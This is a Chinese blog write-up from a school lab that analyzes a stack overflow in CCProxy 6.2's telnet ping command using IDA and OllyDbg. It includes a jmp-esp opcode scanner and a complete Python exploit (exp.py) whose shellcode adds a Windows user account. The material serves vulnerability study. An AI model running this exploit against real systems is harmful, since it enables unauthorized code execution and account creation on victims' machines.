@@ -1,0 +1,141 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>CCProxy6.2 栈溢出分析 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CCProxy6.2 栈溢出分析</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CCProxy6.2 栈溢出分析</h1><div class="post-meta">Jun 13, 2019<span> | </span><span class="category"><a href="/categories/二进制/">二进制</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0X00-前言"><span class="toc-number">1.</span> <span class="toc-text">0X00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X01-先简单说一下溢出点"><span class="toc-number">2.</span> <span class="toc-text">0X01 先简单说一下溢出点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-IDA-静态分析程序"><span class="toc-number">3.</span> <span class="toc-text">0X02 IDA 静态分析程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X02-jmp-esp-地址的获取"><span class="toc-number">4.</span> <span class="toc-text">0X02 jmp esp 地址的获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X03-exp-py"><span class="toc-number">5.</span> <span class="toc-text">0X03 exp.py</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X04-OD-的动态调试"><span class="toc-number">6.</span> <span class="toc-text">0X04 OD 的动态调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X05-补充分析"><span class="toc-number">7.</span> <span class="toc-text">0X05 补充分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0X06-总结"><span class="toc-number">8.</span> <span class="toc-text">0X06 总结</span></a></li></ol></div></div><div class="post-content"><h2 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a><strong>0X00 前言</strong></h2><p>最近看了点二进制的东西，正好学校里面有栈溢出的实验，就简单拿出来分析一下，CCPorxy 6.2 ,一个比较经典的 windows 下的栈溢出，因为是非常老的软件，而且我选择在 windows xp 中运行，因此这里并不涉及保护的问题，只是简单的分析一下。</p>
+<h2 id="0X01-先简单说一下溢出点"><a href="#0X01-先简单说一下溢出点" class="headerlink" title="0X01 先简单说一下溢出点"></a><strong>0X01 先简单说一下溢出点</strong></h2><p>该软件双击运行以后，可以在本机 telnet 127.0.0.1 ,然后再去 ping 一个 ip 地址，我们的栈溢出的点就在这个 ping 后面的地址上</p>
+<p>当我们 Ping 正常地址的时候，以及 ping 一个不存在的地址的时候的反应是不同的，如下图</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA1.png" alt="此处输入图片的描述"></p>
+<a id="more"></a>
+<p>当我们 ping 一个超长的(我这里选择的是 2000 个 A)不存在的地址的字符串的时候，程序会直接崩溃，如下图</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA2.png" alt="此处输入图片的描述"></p>
+<p>说明程序在处理超长地址的时候出现了字符越界的问题，下面我们就用 IDA 静态分析一下</p>
+<h2 id="0X02-IDA-静态分析程序"><a href="#0X02-IDA-静态分析程序" class="headerlink" title="0X02 IDA 静态分析程序"></a><strong>0X02 IDA 静态分析程序</strong></h2><p>首先等待 ida 将程序装载完整，为了快速定位我们首先打开 string 窗口，对我们可能的溢出点进行搜索，特征就是 “Host not found…” 这个字符串</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA3.png" alt="此处输入图片的描述"></p>
+<p>进入以后我们查看这个函数的交叉引用，定位到调用函数的位置</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA4.png" alt="此处输入图片的描述"></p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA5.png" alt="此处输入图片的描述"></p>
+<p>我们使用 F5 看一下源码，可以看到，我们的主机传进去就是 name ,然后我们会将其赋值到 buf 的缓冲区空间，然后造成了溢出</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA6.png" alt="此处输入图片的描述"></p>
+<p>我们回过头看一下这个函数的调用情况</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA7.png" alt="此处输入图片的描述"></p>
+<p>仔细观察他的 ebp 和 esp 的入站情况我们发现，这个程序的设计是不同寻常的，因为，我们往往的函数调用约定是先 push ebp 然后 mov ebp，esp 的,但这里直接先把 esp 提了上去，而 ebp 的位置是由 ecx 决定的，ecx 在前面又经过了非常多的转化，这就让我们通过 ebp 作为基址产生了困难，而且我们也发现上面很多的寻址都是通过 esp 作为基址的，于是这里我们转而使用 esp 作为我们定位 buf 位置的基址</p>
+<p>我们还是使用 F5 看一下 Buf 相对于esp 的偏移</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA8.png" alt="此处输入图片的描述"></p>
+<p>可以看到是  esp+3Ch， 也就是 esp 下面 60 字节的位置，于是我们就很容易的计算出我们的溢出的偏移为 1012 字节。</p>
+<p>有了偏移量，我们下一步要考虑的就是将我们的返回地址覆盖成什么，我的想法首先是覆盖成 shellcode 的地址，但是我们知道栈的空间是不确定的，我们没法确定栈每次都是在那个位置，于是我们还有一种经典的方式是将返回地址覆盖成 jmp esp 的地址，然后让其执行 jmp esp 这条指令。</p>
+<h2 id="0X02-jmp-esp-地址的获取"><a href="#0X02-jmp-esp-地址的获取" class="headerlink" title="0X02 jmp esp 地址的获取"></a><strong>0X02 jmp esp 地址的获取</strong></h2><p>jmp esp 可以看成是一个跳板，在很多程序自带的函数库中都有很多的 jmp esp 的地址，因为这是一个图形化程序，必然自带了 user32.dll ，于是我们可以写程序在 user32.dll 中寻找 Jmp esp 的地址，然后随机选择一个来覆盖我们的返回值</p>
+<p><strong>代码如下：</strong></p>
+<p><strong>search_opcode.c</strong></p>
+<pre><code>//FF E0        JMP EAX
+//FF E1        JMP ECX
+//FF E2        JMP EDX
+//FF E3        JMP EBX
+//FF E4        JMP ESP
+//FF E5        JMP EBP
+//FF E6        JMP ESI
+//FF E7        JMP EDI
+
+//FF D0        CALL EAX
+//FF D1        CALL ECX
+//FF D2        CALL EDX
+//FF D3        CALL EBX
+//FF D4        CALL ESP
+//FF D5        CALL EBP
+//FF D6        CALL ESI
+//FF D7        CALL EDI
+
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#define DLL_NAME &quot;user32.dll&quot;
+main()
+{
+    BYTE* ptr;
+    int position,address;
+    HINSTANCE handle;
+    BOOL done_flag = FALSE;
+
+    handle=LoadLibrary(DLL_NAME);
+
+    if(!handle)
+    {
+        printf(&quot; load dll erro !&quot;);
+        exit(0);
+    }
+
+    ptr = (BYTE*)handle;
+
+    for(position = 0; !done_flag; position++)
+    {
+        try
+        {
+            if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4)
+            {
+                //0xFFE4 is the opcode of jmp esp
+                int address = (int)ptr + position;
+                printf(&quot;OPCODE found at 0x%x\n&quot;,address);
+            }
+        }
+        catch(...)
+        {
+            int address = (int)ptr + position;
+            printf(&quot;END OF 0x%x\n&quot;, address);
+            done_flag = true;
+        }
+    }
+}
+</code></pre><p>通过这个程序的运行，我们能找到很多的 jmp esp 的地址，我这里选择的是最后一个</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA9.png" alt="此处输入图片的描述"></p>
+<h2 id="0X03-exp-py"><a href="#0X03-exp-py" class="headerlink" title="0X03 exp.py"></a><strong>0X03 exp.py</strong></h2><p>接下来就是编写 shellcode ，并且构造我们的 exp 来实现执行命令的操作了</p>
+<pre><code>import socket
+import os
+
+sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+sock.connect((&apos;192.168.43.35&apos;,23))  
+s = sock.recv(4096)  
+
+p =b&apos;ping &apos; + b&apos;\x90&apos;*4                       
+jmp = b&apos;\xE9\x03\xFC\xFF\xFF\x90\x90\x90&apos; # 这里最后会布置到 esp+0xC 的地址，跳转到我们上面的 shellcode      
+
+shellcode= b&apos;\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x0C\xC6\x45\xF0\x6E\xC6\x45\xF1\x65\xC6\x45\xF2\x74\xC6\x45\xF3\x20\xC6\x45\xF4\x75\xC6\x45\xF5\x73\xC6\x45\xF6\x65\xC6\x45\xF7\x72\xC6\x45\xF8\x20\xC6\x45\xF9\x61\xC6\x45\xFA\x20\xC6\x45\xFB\x2F\xC6\x45\xFC\x61\xC6\x45\xFD\x64\xC6\x45\xFE\x64\x8D\x45\xF0\x50\xB8\xC7\x93\xBF\x77\xFF\xD0&apos;  
+junk = b&apos;a&apos;*920                    
+jmpesp = b&apos;\x79\x5b\xe3\x77&apos;            #jump esp 的地址,是从user32.dll中获取的
+
+
+p = p+jmp+shellcode+junk+jmpesp+b&apos;\x90&apos;*16       
+sock.send(p)                        
+sock.send(b&apos;\n&apos;)
+
+s = sock.recv(4096)
+print(s)
+</code></pre><h2 id="0X04-OD-的动态调试"><a href="#0X04-OD-的动态调试" class="headerlink" title="0X04 OD 的动态调试"></a><strong>0X04 OD 的动态调试</strong></h2><p>因为 exp 并不是我写的，我只是简单地修改了一下原始的 exp ，所以我还是要对其进行一些分析，于是我选择使用动态调试工具 OD ，在 exp 打入以后进行单步跟踪调试</p>
+<p>首先在函数拷贝结束以后下断点，找到这个地址的方式是通过 ida 的静态分析获取的 sprintf 的地址，然后直接在 OD 中定位的</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA10.png" alt="此处输入图片的描述"></p>
+<p>然后 F9 运行，然后直接打 exp ，然后运行到即将返回的时候的状态，如下图</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA11.png" alt="此处输入图片的描述"></p>
+<p>首先我们要关注到 retn 0xC ，这说明在执行完这条指令的时候 esp 不只是会向高地址移动 4 字节，还会再继续向高地址移动 0xC 个字节，然后我们再来看右下角的栈区，我们发现此时 esp 移动后指向的是 0xFFFC03E9 ,这个刚好是我们 exp 中的 jmp 变量的值，并且这是一个负数，也就是一个相对的向低地址跳转的指令，也就是说虽然我们在 exp 中看似 jmp 在 shellcode 前面，但是实际上到了栈空间以后还是有所变化的</p>
+<p>然后我们调到 jmp esp 的地址 ，执行 jmp esp </p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA12.png" alt="此处输入图片的描述"></p>
+<p>我们看到正如我们上面分析的，我们的 esp 已经跑到了 0xFFFC03E9 ,我们继续往下执行</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA13.png" alt="此处输入图片的描述"></p>
+<p>此时相对地址已经被计算成为绝对地址，然后我们下一步就会跳转到我们的 shellcode </p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA14.png" alt="此处输入图片的描述"></p>
+<p>该条指令的作用就是想计算机中添加一个名为 a 的用户</p>
+<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/CCProxy6.2%E6%A0%88%E6%BA%A2%E5%87%BA15.png" alt="此处输入图片的描述"></p>
+<h2 id="0X05-补充分析"><a href="#0X05-补充分析" class="headerlink" title="0X05 补充分析"></a><strong>0X05 补充分析</strong></h2><p>计算偏移除了之前使用的 用 ida 去计算以外，我们还能使用随机字符串定位法去计算，我们首先生成比如 2000 个随机字符</p>
+<p><strong>rand.py</strong></p>
+<pre><code>import random
+
+random_str = &apos;&apos;
+base_str = &apos;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&apos;
+length = len(base_str) - 1
+for i in range(5000):
+    random_str += base_str[random.randint(0, length)]
+print(random_str)
+</code></pre><p>然后我们将其打入程序，使用 OD 单步调试直到返回地址，我们会看到返回地址被哪四个字符淹没了，然后我们再去整个字符串中找那四个字符的位置</p>
+<p><strong>find.py</strong></p>
+<pre><code>ori_str1 = &apos;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&apos;
+
+find_str = &apos;aBZ0&apos;
+
+print(ori_str1.find(find_str))
+</code></pre><p>也可以算出来是 1012 字节</p>
+<h2 id="0X06-总结"><a href="#0X06-总结" class="headerlink" title="0X06 总结"></a><strong>0X06 总结</strong></h2><p>这个程序被奉为是比较经典的 windows 栈溢出实例，仔细分析以后能比较好的理解栈溢出的全过程，至于 shellcode 的书写，我们当然也可以用汇编自己写，然后使用 OD 导出来字节码，但是由于这个程序有一些奇怪的机制，使得 opcode 的写入顺序和实际顺序不太一样，就比较难写，我猜测可能是内部做了什么保护机制？不太明白，还需要继续努力。</p>
+</div><div class="tags"><a href="/tags/二进制-栈溢出/">二进制 栈溢出</a></div><div class="post-nav"><a class="next" href="/2019/05/10/python3 爬虫知识梳理(框架篇)/">Python3 爬虫知识梳理(框架篇)</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://www.k0rz3n.com"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/APT/">APT</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/C-C/">C&C</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Kerberos/">Kerberos</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/learning/">learning</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/php/">php</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/wireshark/">wireshark</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/二进制/">二进制</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘/">备忘</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/备忘-笔记/">备忘 笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/学习思考/">学习思考</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞分析/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞研究/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/环境搭建/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/编程/">编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/翻译/">翻译</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/论文/">论文</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/随笔/">随笔</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/渗透测试-技巧/" style="font-size: 15px;">渗透测试 技巧</a> <a href="/tags/APT/" style="font-size: 15px;">APT</a> <a href="/tags/备忘-反向代理-配置/" style="font-size: 15px;">备忘 反向代理 配置</a> <a href="/tags/开发-Github-备忘/" style="font-size: 15px;">开发 Github 备忘</a> <a href="/tags/配置-备忘/" style="font-size: 15px;">配置 备忘</a> <a href="/tags/Linux-渗透测试-备忘/" style="font-size: 15px;">Linux 渗透测试 备忘</a> <a href="/tags/编程-Python-进阶-备忘/" style="font-size: 15px;">编程 Python 进阶 备忘</a> <a href="/tags/网络安全-Python语法/" style="font-size: 15px;">网络安全 Python语法</a> <a href="/tags/gcc-备忘-笔记/" style="font-size: 15px;">gcc 备忘 笔记</a> <a href="/tags/learning/" style="font-size: 15px;">learning</a> <a href="/tags/Windows-FTP搭建-备忘/" style="font-size: 15px;">Windows FTP搭建 备忘</a> <a href="/tags/CTF-Tools/" style="font-size: 15px;">CTF Tools</a> <a href="/tags/学习发现/" style="font-size: 15px;">学习发现</a> <a href="/tags/笔记/" style="font-size: 15px;">笔记</a> <a href="/tags/kali/" style="font-size: 15px;">kali</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/php语法/" style="font-size: 15px;">php语法</a> <a href="/tags/php/" style="font-size: 15px;">php</a> <a href="/tags/wireshark/" style="font-size: 15px;">wireshark</a> <a href="/tags/二进制-栈溢出/" style="font-size: 15px;">二进制 栈溢出</a> <a href="/tags/网络安全-Google-Hacking-信息收集-渗透测试/" style="font-size: 15px;">网络安全 Google Hacking 信息收集 渗透测试</a> <a href="/tags/J2EE-基础/" style="font-size: 15px;">J2EE 基础</a> <a href="/tags/前端/" style="font-size: 15px;">前端</a> <a href="/tags/随笔/" style="font-size: 15px;">随笔</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/web安全-漏洞-CTF/" style="font-size: 15px;">web安全  漏洞  CTF</a> <a href="/tags/PHP-备忘-笔记/" style="font-size: 15px;">PHP 备忘 笔记</a> <a href="/tags/渗透测试-windows-后门/" style="font-size: 15px;">渗透测试 windows 后门</a> <a href="/tags/sql/" style="font-size: 15px;">sql</a> <a href="/tags/编程/" style="font-size: 15px;">编程</a> <a href="/tags/Linux-备忘/" style="font-size: 15px;">Linux 备忘</a> <a href="/tags/备忘-shell-Linux/" style="font-size: 15px;">备忘 shell Linux</a> <a href="/tags/备忘/" style="font-size: 15px;">备忘</a> <a href="/tags/工具使用/" style="font-size: 15px;">工具使用</a> <a href="/tags/网络安全-渗透测试-内网代理/" style="font-size: 15px;">网络安全 渗透测试 内网代理</a> <a href="/tags/渗透测试-局域网扫描/" style="font-size: 15px;">渗透测试 局域网扫描</a> <a href="/tags/备忘-dcoker-getshell-CTF/" style="font-size: 15px;">备忘 dcoker getshell CTF</a> <a href="/tags/工具-渗透测试/" style="font-size: 15px;">工具 渗透测试</a> <a href="/tags/网络安全-渗透测试-sqlmap/" style="font-size: 15px;">网络安全 渗透测试 sqlmap</a> <a href="/tags/静态检测/" style="font-size: 15px;">静态检测</a> <a href="/tags/转载/" style="font-size: 15px;">转载</a> <a href="/tags/Fuzz-XSS/" style="font-size: 15px;">Fuzz XSS</a> <a href="/tags/笔记-协议分析/" style="font-size: 15px;">笔记 协议分析</a> <a href="/tags/Redis-备忘/" style="font-size: 15px;">Redis 备忘</a> <a href="/tags/CSP/" style="font-size: 15px;">CSP</a> <a href="/tags/web安全-CTF-渗透测试-PHP/" style="font-size: 15px;">web安全 CTF 渗透测试 PHP</a> <a href="/tags/域渗透/" style="font-size: 15px;">域渗透</a> <a href="/tags/Java-备忘-笔记/" style="font-size: 15px;">Java 备忘 笔记</a> <a href="/tags/JSONP/" style="font-size: 15px;">JSONP</a> <a href="/tags/编程-C-类库/" style="font-size: 15px;">编程 C++ 类库</a> <a href="/tags/CTF-writeup/" style="font-size: 15px;">CTF writeup</a> <a href="/tags/java-备忘/" style="font-size: 15px;">java 备忘</a> <a href="/tags/web安全-CTF/" style="font-size: 15px;">web安全 CTF</a> <a href="/tags/web安全-MySQL-渗透测试/" style="font-size: 15px;">web安全 MySQL 渗透测试</a> <a href="/tags/编程-PHP-基础/" style="font-size: 15px;">编程 PHP 基础</a> <a href="/tags/网络安全-沙盒逃逸-Python/" style="font-size: 15px;">网络安全 沙盒逃逸 Python</a> <a href="/tags/SQL-语法/" style="font-size: 15px;">SQL 语法</a> <a href="/tags/web安全-漏洞分析/" style="font-size: 15px;">web安全 漏洞分析</a> <a href="/tags/网络安全-钓鱼-恶意代码分析-漏洞分析/" style="font-size: 15px;">网络安全 钓鱼 恶意代码分析 漏洞分析</a> <a href="/tags/漏洞研究/" style="font-size: 15px;">漏洞研究</a> <a href="/tags/密码学-网络协议/" style="font-size: 15px;">密码学 网络协议</a> <a href="/tags/fuzz/" style="font-size: 15px;">fuzz</a> <a href="/tags/编程-PHP-进阶/" style="font-size: 15px;">编程 PHP 进阶</a> <a href="/tags/爬虫/" style="font-size: 15px;">爬虫</a> <a href="/tags/Fuzz/" style="font-size: 15px;">Fuzz</a> <a href="/tags/符号执行/" style="font-size: 15px;">符号执行</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/编程-JAVA-基础/" style="font-size: 15px;">编程 JAVA 基础</a> <a href="/tags/污点分析/" style="font-size: 15px;">污点分析</a> <a href="/tags/PHP-静态检测/" style="font-size: 15px;">PHP 静态检测</a> <a href="/tags/Windows-批处理-备忘/" style="font-size: 15px;">Windows 批处理 备忘</a> <a href="/tags/SQL-注入/" style="font-size: 15px;">SQL 注入</a> <a href="/tags/流量分析/" style="font-size: 15px;">流量分析</a> <a href="/tags/编程-C-基础/" style="font-size: 15px;">编程 C++ 基础</a> <a href="/tags/编程-进阶/" style="font-size: 15px;">编程 进阶</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/06/13/CCProxy6.2 栈溢出分析/">CCProxy6.2 栈溢出分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/10/python3 爬虫知识梳理(框架篇)/">Python3 爬虫知识梳理(框架篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/07/python3 爬虫知识梳理(实战篇)/">Python3 爬虫知识梳理(实战篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/Python3 爬虫知识梳理(基础篇)/">Python3 爬虫知识梳理(基础篇)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/New Page ,New Future/">New Page,New Future</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/JAVA 泛型、动态代理技术要点梳理/">JAVA 泛型、动态代理技术要点梳理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/04/TCTF 2019 线上赛 web 题 writeup/">TCTF 2019 线上赛 web 题 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/2018 APT (Advanced Persistent Threat)攻击大事件/">2018 APT (Advanced Persistent Threat)攻击大事件</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/APT(高级持续威胁) 概念以及趋势概述/">APT(高级持续威胁) 概念以及趋势概述</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/威胁情报概念与APT事件分析模型概述/">威胁情报概念与APT事件分析模型概述</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://math1as.com/" title="math1as" target="_blank">math1as</a><ul></ul><a href="https://www.zsxsoft.com/" title="zsx" target="_blank">zsx</a><ul></ul><a href="https://www.lorexxar.cn/" title="Lorexxar" target="_blank">Lorexxar</a><ul></ul><a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a><ul></ul><a href="http://www.cnblogs.com/iamstudy/" title="L3m0n" target="_blank">L3m0n</a><ul></ul><a href="http://www.pupiles.com" title="pupiles" target="_blank">pupiles</a><ul></ul><a href="http://f1sh.site/" title="f1sh" target="_blank">f1sh</a><ul></ul><a href="https://www.leavesongs.com/" title="phithon" target="_blank">phithon</a><ul></ul><a href="http://sh3ll.me/" title="Chu" target="_blank">Chu</a><ul></ul><a href="https://www.virzz.com/" title="Virink" target="_blank">Virink</a><ul></ul><a 